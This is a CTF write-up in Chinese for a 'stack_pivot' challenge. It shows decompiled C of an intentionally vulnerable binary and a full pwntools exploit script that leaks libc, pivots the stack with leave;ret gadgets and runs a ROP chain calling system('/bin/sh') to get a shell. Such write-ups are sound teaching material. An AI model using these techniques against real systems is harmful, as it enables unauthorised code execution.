# stack_pivot

反编译：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[512]; // [rsp+0h] [rbp-200h] BYREF

  init();
  vuln(v4);
  return 0;
}

ssize_t __fastcall vuln(void *a1)
{
  _BYTE v2[80]; // [rsp+10h] [rbp-50h] BYREF

  puts("Pivot me if you can!");
  printf("buf @ %p\n", a1);
  printf("puts @ %p\n", &puts);
  puts("Stage your ROP chain:");
  read(0, a1, 0x200u);
  puts("Now overflow:");
  return read(0, v2, 0x60u);
}
```

给了栈地址和 libc 地址，但是第二次 overflow 只能覆盖保存的 rbp 和返回地址，因此需要 stack pivoting，利用两次 leave; ret，通过 rbp，把栈挪到第一次 overflow 的栈空间（实际上，这题因为 main 和 vuln 函数的栈是连着的，不用 stack pivoting 也行，这里主要是为了演示这种思路，刻意把两段 ROP 分开写），再进行 rop 攻击：

```python
from pwn import *

context(log_level="DEBUG")
context.terminal = ["tmux", "split-w", "-h"]
context.arch = "amd64"

if args.REMOTE:
    p = remote(args.HOST, args.PORT)
else:
    # p = process("strace -o strace.log ./vuln.patched", shell=True)
    p = process("./vuln.patched")
elf = ELF("./vuln.patched")
libc = elf.libc

p.recvuntil(b"buf @ ")
stack_addr = int(p.recvline().decode(), 16)
print(f"stack addr 0x{stack_addr:x}")
p.recvuntil(b"puts @ ")
puts_addr = int(p.recvline().decode(), 16)
print(f"puts addr 0x{puts_addr:x}")
libc_addr = puts_addr - libc.symbols["puts"]
print(f"libc addr 0x{libc_addr:x}")
libc.address = libc_addr

rop = ROP(libc)
leave_ret = rop.find_gadget(["leave", "ret"]).address
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address


sh_addr = next(libc.search(b"/bin/sh\x00"))
payload = b"B" * 0x20 + p64(pop_rdi_ret) + p64(sh_addr) + p64(libc.symbols["system"])
print(payload)
p.recvuntil(b"Stage your ROP chain:")
p.send(payload)

# first leave; ret:
# rsp = rbp; pop rbp; pop rip
# then, rbp is stack_addr + 0x18
# second leave; ret:
# rsp = rbp; pop rbp; pop rip
# rop chain continues at stack_addr + 0x20

payload = b"A" * 0x50 + p64(stack_addr + 0x18) + p64(leave_ret)
print(payload)
p.recvuntil(b"Now overflow:")

# pause()
# gdb.attach(p)

p.send(payload)

p.interactive()
```
